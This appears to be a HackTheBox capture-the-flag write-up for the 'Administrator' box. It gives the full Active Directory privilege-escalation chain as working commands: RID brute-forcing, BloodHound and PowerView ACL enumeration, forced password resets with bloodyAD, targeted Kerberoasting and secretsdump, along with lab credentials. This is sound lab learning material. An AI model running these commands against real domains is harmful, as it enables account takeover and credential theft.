# Administrator -- HackTheBox (write-up)

**Difficulty:** Medium
**Box:** Administrator (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-08-17

---

## TL;DR

### AD chain: Olivia -> Michael (GenericAll) -> Benjamin (ForceChangePassword via bloodyAD) -> Emily (PasswordSafe) -> Ethan (targeted Kerberoast) -> DA via secretsdump.
---
## Target info

- Host: `10.10.11.42`
- Domain: `administrator.htb`
---
## Enumeration

![Nmap results](images/administrator-htb_1.png)

Found users:

![Users](images/administrator-htb_2.png)

Can also enumerate via:

```bash
nxc smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute | grep SidTypeUser
```

![RID brute](images/administrator-htb_3.png)

Collected BloodHound data:

```bash
nxc ldap administrator.htb -u Olivia -p ichliebedich --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```

---
## Attack chain

Checked first-degree outbound control on Olivia:

![Olivia outbound](images/administrator-htb_4.png)

Michael leads to Benjamin, who has no outbound controls -- worth targeting:

![Benjamin](images/administrator-htb_5.png)

Used PowerView to confirm ACLs:

```powershell
. .\PowerView.ps1

$Olivia = Get-ADUser -Identity "olivia" -Properties ObjectSID
```

![PowerView](images/administrator-htb_6.png)

```powershell
$MichaelACL = Get-DomainObjectAcl -Identity "CN=Michael Williams,CN=Users,DC=administrator,DC=htb" -ResolveGUIDs
$MichaelACL | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID -and $_.ActiveDirectoryRights -match "GenericAll" } | Select-Object IdentityReference, ActiveDirectoryRights

$BenjaminACL | Where-Object { $_.SecurityIdentifier -eq $Michael.ObjectSID -and $_.ActiveDirectoryRights -match "ForceChangePassword" } | Select-Object IdentityReference, ActiveDirectoryRights

$UsersAcls = Get-DomainObjectAcl -SearchBase "CN=Users,DC=administrator,DC=htb" -ResolveGUIDs
```

![ACLs](images/administrator-htb_7.png)

```powershell
$UsersAcls | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID } | Select-Object IdentityReference, ObjectDN, ActiveDirectoryRights | Format-Table -AutoSize
```

![Olivia rights](images/administrator-htb_8.png)

Checked Benjamin's extended rights -- S-1-1-0 (Everyone) has User-Change-Password:

```powershell
(Get-DomainObjectAcl -Identity "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb" -ResolveGUIDs) | Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" -and $_.ObjectAceType -match "User-Change-Password" } | Format-Table SecurityIdentifier, IdentityReference, ActiveDirectoryRights, ObjectAceType -AutoSize
```

![Extended rights](images/administrator-htb_9.png)

**net user command didn't work for changing Benjamin's password directly.**

![Failed attempt](images/administrator-htb_10.png)

Changed Michael's password first (Olivia has GenericAll over Michael), then used bloodyAD from Michael to change Benjamin's:

```bash
bloodyAD -u "Michael" -p "Password123" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
```

![bloodyAD](images/administrator-htb_11.png)

bloodyAD works because it uses LDAP to exploit the User-Change-Password extended right, unlike `net user` which relies on local account privileges.

![Benjamin access](images/administrator-htb_12.png)

![FTP share](images/administrator-htb_13.png)

Found a PasswordSafe database. Installed and opened it:

```bash
sudo apt install passwordsafe
pwsafe
```

Extracted creds:

- `alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
- `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
- `emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur`

![BloodHound Emily](images/administrator-htb_14.png)

Emily has write permissions over Ethan -- targeted Kerberoasting.

Added `administrator.htb` and `dc.administrator.htb` to `/etc/hosts`.

```bash
targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```

![Kerberoast](images/administrator-htb_15.png)

Cracked Ethan's hash, then secretsdump:

```bash
secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
```

![secretsdump](images/administrator-htb_16.png)

---
## Lessons & takeaways

- BloodHound first-degree outbound controls reveal the full chain
- bloodyAD can exploit LDAP-based extended rights that `net user` can't
- targetedKerberoast sets a temporary SPN, grabs the hash, then removes it
- PowerView confirms ACLs manually when BloodHound isn't enough
---
